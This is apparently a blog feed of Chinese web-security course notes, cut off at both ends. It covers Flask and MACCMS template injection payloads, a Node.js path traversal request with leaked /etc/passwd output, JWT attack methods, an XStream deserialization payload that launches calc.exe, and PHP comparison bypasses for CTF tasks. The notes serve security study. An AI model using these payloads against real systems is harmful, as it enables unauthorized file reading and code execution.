class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">1、源码分析SSTI考点</span><br><span class="line">2、测试判断SSTI存在</span><br><span class="line">/shrine/&#123;&#123;9*9&#125;&#125;</span><br><span class="line">3、分析代码过滤和FLAG存储</span><br><span class="line"></span><br><span class="line">4、利用Flask两个函数利用获取</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/houyanhua1/article/details/85470175</span><br><span class="line">url_for()函数是用于构建操作指定函数的URL</span><br><span class="line">get_flashed_messages()函数是获取传递过来的数据</span><br><span class="line"></span><br><span class="line"># 查看全局变量 </span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line"># 查看当前变量app，源码当中出现.config存储flag，尝试调用.config </span><br><span class="line"># 直接炸出了flag    flag&#123;9576c444-a177-4fee-88f6-146e59e4c9d6&#125;</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 获取对象，再转到全局变量</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br><span class="line"># 转到当前APP，还是转到config获取flag</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="SSTI考点-CMS源码-MACCMS-V8-X执行"><a href="#SSTI考点-CMS源码-MACCMS-V8-X执行" class="headerlink" title="SSTI考点-CMS源码-MACCMS_V8.X执行"></a>SSTI考点-CMS源码-MACCMS_V8.X执行</h1><p>这是苹果的CMS……</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Payload:index.php?m=vod-search&amp;wd=&#123;<span class="keyword">if</span>-dddd:<span class="title function_ invoke__">phpinfo</span>()&#125;&#123;<span class="keyword">endif</span>-dddd&#125;</span><br><span class="line"><span class="number">1</span>、根据wd传递的代码找指向文件</span><br><span class="line"><span class="number">2</span>、index-&gt;vod-&gt;tpl-&gt;ifex-&gt;<span class="keyword">eval</span></span><br><span class="line"><span class="number">3</span>、构造Payload带入ifex并绕过后执行</span><br></pre></td></tr></table></figure><p>模板漏洞基本上都在白盒漏洞，有的扫都扫不出来。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0013-WEB攻防-04-JS</title>
      <link href="/2023/05/13/SEC-Study-0041/"/>
      <url>/2023/05/13/SEC-Study-0041/</url>
      
        <content type="html"><![CDATA[<p>解析性语言与前端语言的区别：</p><blockquote><p>解析性语言前端与后端的代码量不一致。（有隐私，黑盒测试）例如：PHP，java<br>前端性语言基本上前后端代码量对等。（无隐私，白盒测试）例如：js，html</p></blockquote><p>1、原生JS&amp;开发框架-安全条件<br>2、常见安全问题-前端验证&amp;未授权</p><h1 id="安全条件-可控变量-amp-特定函数"><a href="#安全条件-可控变量-amp-特定函数" class="headerlink" title="安全条件-可控变量&amp;特定函数"></a>安全条件-可控变量&amp;特定函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JS渗透测试：存在可控变量和特定函数即存在JS参数漏洞</span></span><br><span class="line"></span><br><span class="line">- js代码原生态，全部暴露在前端 ==&gt; 能给更多的信息给我们参考。</span><br><span class="line">- 识别JS的方法：</span><br><span class="line">    <span class="number">1</span>.插件识别：<span class="title function_ invoke__">wappalyzer</span>(浏览器插件)</span><br><span class="line">    <span class="number">2</span>.前端页面查看源代码识别 ==&gt; 浏览器右键查看源代码，源代码分为：</span><br><span class="line"><span class="number">2.1</span>.引入js--从外部引入的JS文件</span><br><span class="line"><span class="number">2.2</span>.嵌入JS--嵌套在源代码当中的js</span><br><span class="line">    <span class="number">3</span>.审查元素识别：浏览器开发者模式的Network ==&gt; JS文件越多，越证明其为JS网站/利用JS实现功能</span><br><span class="line">    <span class="number">4</span>.简短代码的JS嵌套：代码简短，但实际运用到的js全部在引用文件当中。</span><br><span class="line">        =&gt; &lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;join.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    <span class="number">5</span>.特征JS文件：特殊名字的JS文件可能存在着JS功能实现代码，例如app.js,<span class="built_in">static</span>.js,js.js</span><br><span class="line">        JS验证代码逻辑全部暴露在前端 ==&gt; 白盒测试，抓包绕过前端代码逻辑，可能出现无验证重置密码，可以直接绕过检测直接重置对应账号的密码。</span><br><span class="line"><span class="number">6</span>.特征参数：cookie中有connect.sid</span><br><span class="line"></span><br><span class="line">- 当网站将验证什么的都放在JS时，使用网站下载器下载网站并且修改其中的内容，注释掉关键的JS再二次使用，等同于直接绕过了JS验证</span><br></pre></td></tr></table></figure><h1 id="开发框架-Vulhub-Node-JS安全"><a href="#开发框架-Vulhub-Node-JS安全" class="headerlink" title="开发框架-Vulhub-Node.JS安全"></a>开发框架-Vulhub-Node.JS安全</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">框架是为了便捷我们的开发，他人提前写好的。开发时直接调用框架相关内容即可。</span><br><span class="line">它会帮我们提前写好很多东西并且封装好，方便我们调用。</span><br><span class="line"><span class="comment"># 缺点：如果爆出漏洞，使用它的网站就遭殃了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 国内最出名：VUE，Node.js</span></span><br></pre></td></tr></table></figure><p>node.js路径穿越漏洞</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 发包</span></span><br><span class="line"><span class="type">GET</span> /static/../../../a/../../../../etc/passwd <span class="type">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="type">Host</span>: <span class="number">192.168</span>.<span class="number">232.134</span>:<span class="number">3000</span></span><br><span class="line"><span class="type">User</span>-<span class="type">Agent</span>: <span class="type">Mozilla</span>/<span class="number">5.0</span> (<span class="type">Windows</span> <span class="type">NT</span> <span class="number">10.0</span>; <span class="type">Win64</span>; x64; rv:<span class="number">109.0</span>) <span class="type">Gecko</span>/<span class="number">20100101</span> <span class="type">Firefox</span>/<span class="number">113.0</span></span><br><span class="line"><span class="type">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line"><span class="type">Accept</span>-<span class="type">Language</span>: zh-<span class="type">CN</span>,zh;q=<span class="number">0.8</span>,zh-<span class="type">TW</span>;q=<span class="number">0.7</span>,zh-<span class="type">HK</span>;q=<span class="number">0.5</span>,en-<span class="type">US</span>;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line"><span class="type">Accept</span>-<span class="type">Encoding</span>: gzip, deflate</span><br><span class="line"><span class="type">Connection</span>: close</span><br><span class="line"><span class="type">Upgrade</span>-<span class="type">Insecure</span>-<span class="type">Requests</span>: <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 收包</span></span><br><span class="line"><span class="type">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="type">OK</span></span><br><span class="line"><span class="type">X</span>-<span class="type">Powered</span>-<span class="type">By</span>: <span class="type">Express</span></span><br><span class="line"><span class="type">Accept</span>-<span class="type">Ranges</span>: bytes</span><br><span class="line"><span class="type">Cache</span>-<span class="type">Control</span>: public, max-age=<span class="number">0</span></span><br><span class="line"><span class="type">Last</span>-<span class="type">Modified</span>: <span class="type">Wed</span>, <span class="number">13</span> <span class="type">Sep</span> <span class="number">2017</span> <span class="number">20</span>:<span class="number">05</span>:<span class="number">31</span> <span class="type">GMT</span></span><br><span class="line"><span class="type">ETag</span>: <span class="type">W</span>/<span class="string">&quot;4d4-15e7cd8b6f8&quot;</span></span><br><span class="line"><span class="type">Content</span>-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"><span class="type">Content</span>-<span class="type">Length</span>: <span class="number">1236</span></span><br><span class="line"><span class="type">Date</span>: <span class="type">Sun</span>, <span class="number">14</span> <span class="type">May</span> <span class="number">2023</span> <span class="number">08</span>:<span class="number">21</span>:<span class="number">36</span> <span class="type">GMT</span></span><br><span class="line"><span class="type">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="title">root</span>:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line"><span class="title">daemon</span>:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"><span class="title">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line"><span class="title">sys</span>:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="title">sync</span>:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/bin:/bin/sync</span><br><span class="line"><span class="title">games</span>:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin</span><br><span class="line"><span class="title">man</span>:x:<span class="number">6</span>:<span class="number">12</span>:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line"><span class="title">lp</span>:x:<span class="number">7</span>:<span class="number">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line"><span class="title">mail</span>:x:<span class="number">8</span>:<span class="number">8</span>:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line"><span class="title">news</span>:x:<span class="number">9</span>:<span class="number">9</span>:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line"><span class="title">uucp</span>:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line"><span class="title">proxy</span>:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/bin:/usr/sbin/nologin</span><br><span class="line"><span class="title">www</span>-<span class="class"><span class="keyword">data</span>:x:33:33:www-<span class="keyword">data</span>:/var/www:/usr/sbin/nologin</span></span><br><span class="line"><span class="title">backup</span>:x:<span class="number">34</span>:<span class="number">34</span>:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line"><span class="title">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:<span class="type">Mailing</span> <span class="type">List</span> <span class="type">Manager</span>:/var/list:/usr/sbin/nologin</span><br><span class="line"><span class="title">irc</span>:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line"><span class="title">gnats</span>:x:<span class="number">41</span>:<span class="number">41</span>:<span class="type">Gnats</span> <span class="type">Bug</span>-<span class="type">Reporting</span> <span class="type">System</span> (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line"><span class="title">nobody</span>:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line"><span class="title">systemd</span>-timesync:x:<span class="number">100</span>:<span class="number">103</span>:systemd <span class="type">Time</span> <span class="type">Synchronization</span>,,,:/run/systemd:/bin/false</span><br><span class="line"><span class="title">systemd</span>-network:x:<span class="number">101</span>:<span class="number">104</span>:systemd <span class="type">Network</span> <span class="type">Management</span>,,,:/run/systemd/netif:/bin/false</span><br><span class="line"><span class="title">systemd</span>-resolve:x:<span class="number">102</span>:<span class="number">105</span>:systemd <span class="type">Resolver</span>,,,:/run/systemd/resolve:/bin/false</span><br><span class="line"><span class="title">systemd</span>-bus-proxy:x:<span class="number">103</span>:<span class="number">106</span>:systemd <span class="type">Bus</span> <span class="type">Proxy</span>,,,:/run/systemd:/bin/false</span><br><span class="line"><span class="title">node</span>:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/node:/bin/bash</span><br></pre></td></tr></table></figure><h1 id="获取和挖掘JS"><a href="#获取和挖掘JS" class="headerlink" title="获取和挖掘JS"></a>获取和挖掘JS</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 如何获取更多的JS文件？</span><br><span class="line">JsFinder</span><br><span class="line">    Packer-Fuzzer</span><br><span class="line">扫描器后缀替换字典</span><br><span class="line"></span><br><span class="line">- 如何快速获取价值代码？</span><br><span class="line">method:<span class="string">&quot;get&quot;</span></span><br><span class="line">http.<span class="title function_ invoke__">get</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">method:&quot;</span>post<span class="string">&quot;</span></span><br><span class="line"><span class="string">http.post(&quot;</span></span><br><span class="line">$.ajax</span><br><span class="line">service.httppost</span><br><span class="line">service.httpget</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0012-WEB攻防-03-JavaWeb/JWT</title>
      <link href="/2023/05/12/SEC-Study-0040/"/>
      <url>/2023/05/12/SEC-Study-0040/</url>
      
        <content type="html"><![CDATA[<blockquote><p>白盒JAFVA。<br>如何从java代码当中分析你的组件有没有安全问题。或者黑盒角度看组件当中是否存在安全问题。<br>注入在java当中很难产生。<br>java的预编译机制筛掉了很多漏洞，例如注入漏洞。</p></blockquote><h1 id="JAVA知识点-Java-JWT-安全组件"><a href="#JAVA知识点-Java-JWT-安全组件" class="headerlink" title="JAVA知识点-Java/JWT/安全组件"></a>JAVA知识点-Java/JWT/安全组件</h1><p>1、JavaWeb常见安全及代码逻辑<br>2、目录遍历&amp;身份验证&amp;逻辑&amp;JWT<br>3、访问控制&amp;安全组件&amp;越权&amp;三方组件</p><p>java无代码难度巨大</p><h2 id="JavaWeb-WebGoat8靶场搭建使用"><a href="#JavaWeb-WebGoat8靶场搭建使用" class="headerlink" title="JavaWeb-WebGoat8靶场搭建使用"></a>JavaWeb-WebGoat8靶场搭建使用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 环境下载：https://github.com/WebGoat/WebGoat</span></span><br><span class="line"></span><br><span class="line">- 搭建以及访问</span><br><span class="line">    启动jar包，搭建环境，端口<span class="number">9091</span>.（启动web服务器，源码是webgoat-server-<span class="number">8.1</span>.<span class="number">0</span>.jar）</span><br><span class="line">        $ java -jar webgoat-server-<span class="number">8.1</span>.<span class="number">0</span>.jar  --server.port=<span class="number">9091</span></span><br><span class="line">    访问方法：http:<span class="comment">//127.0.0.1:9091/WebGoat/login.html</span></span><br><span class="line">    初次需要注册，且页面全英文</span><br><span class="line"></span><br><span class="line">- 关卡众多</span><br><span class="line">  <span class="number">1</span>.各种各样的安全问题，分等级打关</span><br><span class="line">    寻找对应文件的包的办法(数据包中URL与相关数据&lt;==映射==&gt;源码中的执行文件与执行方法)：</span><br><span class="line">      <span class="number">1</span>.抓包: 抓对应的访问流量包</span><br><span class="line">      <span class="number">2</span>.识别: 根据抓包反馈的URL信息到对应的目录下去找到相似的jar包(例如jar忽略大小写，找到相似拼写的文件名包)</span><br><span class="line">      <span class="number">3</span>.分析: 根据URL特征以及包内携带的POST信息等，分析执行的方法在哪个位置，再分析执行逻辑，找到特殊函数</span><br><span class="line">      <span class="number">4</span>.最终目的：找到URL对应的可执行文件，寻找当中的逻辑是否存在安全问题</span><br><span class="line">  <span class="number">2</span>.文件上传漏洞所在的关卡</span><br><span class="line">    <span class="number">1</span>.打开http:<span class="comment">//127.0.0.1:9091/WebGoat</span></span><br><span class="line">    <span class="number">2</span>.选择A1，并且转到最后的Path traversal即可</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安全问题-目录遍历-amp-身份认证-JWT攻击"><a href="#安全问题-目录遍历-amp-身份认证-JWT攻击" class="headerlink" title="安全问题-目录遍历&amp;身份认证-JWT攻击"></a>安全问题-目录遍历&amp;身份认证-JWT攻击</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- 小插曲：解压jar</span><br><span class="line">  IJ内获取jar包的源码的简易方法：选中并且选择自动解压即可</span><br><span class="line">  优先查看配置性文件：例如META-INF</span><br><span class="line"></span><br><span class="line">- 文件上传漏洞的价值：</span><br><span class="line">    漏洞：任意位置文件上传(通用型漏洞)</span><br><span class="line">    应用的价值：后门漏洞   </span><br><span class="line">    安全限制：目录可执行权限限制，例如限制图片目录无脚本执行权限 </span><br><span class="line">      ==&gt; 攻击思路：将脚本放在可执行目录下，例如主目录</span><br><span class="line"></span><br><span class="line">- 目录遍历与数据库遍历</span><br><span class="line">  后门脚本执行权限防护设置：</span><br><span class="line">    指定目录设置后门限制，无法执行脚本文件。例如图片目录。不受到限制的执行目录是根目录。</span><br><span class="line">    例如：在上传文件(如用户头像)时，爆出上传路径，路径被任意修改后会导致任意文件上传漏洞</span><br><span class="line"></span><br><span class="line">- 逻辑漏洞:键值对双双传入</span><br><span class="line">  正常接受和访问：接受键值，再放到对应的查询语句到后台去查询</span><br><span class="line">  异常接受与访问：接受键名和键值，再放到数据库去查询，造成数据的任意查找漏洞。</span><br><span class="line">                安全修复：修复键名为锁死，防止存在不存在键名问题。</span><br></pre></td></tr></table></figure><h3 id="身份验证-amp-JWT"><a href="#身份验证-amp-JWT" class="headerlink" title="身份验证&amp;JWT"></a>身份验证&amp;JWT</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.涉及题库：靶场A2的Authentication Bypasses </span><br><span class="line">  <span class="number">1</span>.目的： 重置密码回答问题的绕过，需要绕过回答问题到重置密码那里</span><br><span class="line">  <span class="number">2</span>.漏洞：</span><br><span class="line">    <span class="comment">#接受问题答案时时接受键值对的，而不是单纯的接受值</span></span><br><span class="line">    <span class="comment">#接受键值对，造成数据库查询漏洞</span></span><br><span class="line">  <span class="number">3</span>.修正漏洞：改为只接受固定键名</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.JWT安全问题（ JSON Web Tokens）</span><br><span class="line">  功能：解决身份认证的安全问题。</span><br><span class="line">  组成：header.payload.signature</span><br><span class="line">  识别方法：</span><br><span class="line">    <span class="number">1</span>.cookie出现两点作为间隔符号，大小写区分的字母+数字组成的长串字符串，</span><br><span class="line">          格式类似于：</span><br><span class="line">          xxx_token=xxxxxxxxx.xxxxxx.xxxxxx</span><br><span class="line">                    算法内容           密钥</span><br><span class="line">                    单纯的修改payload内容，没有修改密钥部分的内容也是不行的</span><br><span class="line"></span><br><span class="line">    <span class="number">2</span>.查看cookie，在游客状态和登录状态下的区别是否存在上述情况，是则存在JWT</span><br><span class="line">  应用领域：Web应用-java/Python身份验证</span><br></pre></td></tr></table></figure><h3 id="JWT攻击方法"><a href="#JWT攻击方法" class="headerlink" title="JWT攻击方法"></a>JWT攻击方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">博客资源：https:<span class="comment">//www.cnblogs.com/vege/p/14468030.html</span></span><br><span class="line">  <span class="number">1</span>.空加密算法攻击(签名没验证空加密)：</span><br><span class="line">      修改header部分的内容，去除掉部分的修改解密算法的模式none，最后去掉第三段即可（前提是服务器支持不要密钥生成的--空模式加密）</span><br><span class="line">      --使用脚本生成空加密算法进行攻击</span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>.爆破密钥：</span><br><span class="line">    使用爆破字典+python特定爆破代码进行爆破，爆破出真实密钥就能实现任意用户登录</span><br><span class="line">    -- 注意: 如果字典不得行(不够强大)时，一定爆破不出密钥的。</span><br><span class="line">    -- 注意: 爆破的脚本不能命名为jwt.py，会导致导入包直接失效（导包冲突）！切记！</span><br><span class="line">    拿到密钥后，直接在官网(jwt.io)使用密钥进行生成</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>.kid攻击：</span><br><span class="line">    kid功能：可选参数，用于指定加密算法的密钥。</span><br><span class="line">    危害：</span><br><span class="line">      <span class="number">1</span>. 任意文件读取</span><br><span class="line">      <span class="number">2</span>. SQL注入</span><br><span class="line">      <span class="number">3</span>. 命令注入</span><br></pre></td></tr></table></figure><h2 id="安全问题-访问控制-amp-安全组件-第三方组件"><a href="#安全问题-访问控制-amp-安全组件-第三方组件" class="headerlink" title="安全问题-访问控制&amp;安全组件-第三方组件"></a>安全问题-访问控制&amp;安全组件-第三方组件</h2><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><h4 id="隐藏属性"><a href="#隐藏属性" class="headerlink" title="隐藏属性"></a>隐藏属性</h4><p>前端为了不在明面上展示过多的信息，使用了隐藏属性隐藏了部分信息。例如获取坐标信息并且存入表单当中用于提交：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;xxx.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">  <span class="comment">// hidden是前端表单的隐藏属性。</span></span><br><span class="line">  &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;idport&quot;</span> value=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>];<span class="meta">?&gt;</span> &gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>隐藏敏感信息，防止用户篡改敏感信息 <strong>越权</strong> 查看其它用户信息什么的。查看隐藏属性的办法很简单，使用查看源码就能看到了。</p><h4 id="水平越权：同一级别用户权限的查看"><a href="#水平越权：同一级别用户权限的查看" class="headerlink" title="水平越权：同一级别用户权限的查看"></a>水平越权：同一级别用户权限的查看</h4><p>与上面的差不多，篡改后实现同等级查看其它用户的敏感信息。</p><h3 id="安全组件"><a href="#安全组件" class="headerlink" title="安全组件"></a>安全组件</h3><p>关键点：是否调用了第三方的组件库。</p><ul><li>联想到刚爆出的Log4j2</li><li>想要利用Log4j漏洞，看哪个地方导入了Log4j库即可。</li></ul><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">  calc.exe是服务器的一个计算机程序 </span></span><br><span class="line"><span class="comment">  如果替换成任意文件的下载命令，就能传入后门，对服务器的安全构成威胁。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0011-WEB攻防-02-PHP</title>
      <link href="/2023/05/11/SEC-Study-0039/"/>
      <url>/2023/05/11/SEC-Study-0039/</url>
      
        <content type="html"><![CDATA[<h1 id="Web攻防-PHP"><a href="#Web攻防-PHP" class="headerlink" title="Web攻防-PHP"></a>Web攻防-PHP</h1><p>暂时未讲漏洞。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1、过滤函数缺陷绕过<br>2、CTF考点与代码审计 –&gt; 重点在实际应用，而不是为了比赛而比赛</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">==与===</span><br><span class="line">md5</span><br><span class="line">intval</span><br><span class="line">strpos</span><br><span class="line">in_array</span><br><span class="line">preg_match</span><br><span class="line">str_replace</span><br><span class="line">过滤器的不严谨会导致注入产生</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.赋值与对比符号(CTF考点)</span><br><span class="line">    =   赋值</span><br><span class="line">    ==  对比，不对比类型        =&gt; 不具备唯一性，导致其他多种情况下条件成立</span><br><span class="line">        举例：<span class="number">1.0</span>和<span class="number">1</span>和+<span class="number">1</span></span><br><span class="line">        CTF赛事：存在绕过</span><br><span class="line">    === 对比，包括对比类型      =&gt; 强类型对比</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>==<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//1.0 +1 1a</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//1.0 +1等</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.加密</span><br><span class="line">    md5 加密函数，md5的对比</span><br><span class="line">    例如：尝试获得flag</span><br><span class="line">    题<span class="number">1</span> 利用的是(==)的弱类型比较</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])==<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    满足<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]，但是俩MD5值相等</span><br><span class="line">    当遇到<span class="number">0</span>e开头的md5值时，使用(==)进行比较默认值MD5值相等</span><br><span class="line"></span><br><span class="line">    题<span class="number">2</span> 和上面不同点在于，他是强类型比较(===)</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])===<span class="title function_ invoke__">MD5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    使用数组进行绕过:MD5函数不识别数组，当参数为数组时返回<span class="literal">null</span></span><br><span class="line">    此时出现<span class="literal">null</span>===<span class="literal">null</span>,两者值相等，得到flag（这操作有点骚）</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.获取变量整数值的函数</span><br><span class="line">    <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>[,<span class="variable">$base</span>=<span class="number">10</span>] ) : </span><br><span class="line">        默认将<span class="variable">$value</span>转换为十进制整数，还能实现各个进制转<span class="number">10</span>进制整数。</span><br><span class="line">        <span class="variable">$base</span>默认为<span class="number">10</span>进制</span><br><span class="line">        如果是<span class="number">0</span>时，通过<span class="keyword">var</span>的格式来决定使用的进制:</span><br><span class="line">            <span class="number">0</span>x(<span class="number">16</span>进制)，<span class="number">0</span>(八进制)，<span class="number">10</span>(十进制),<span class="number">0</span>b(二进制)</span><br><span class="line">    </span><br><span class="line">    缺陷绕过</span><br><span class="line">    案例如下：</span><br><span class="line">    题目<span class="number">1</span></span><br><span class="line">    <span class="variable">$i</span>=<span class="number">666</span>;<span class="variable">$ii</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span 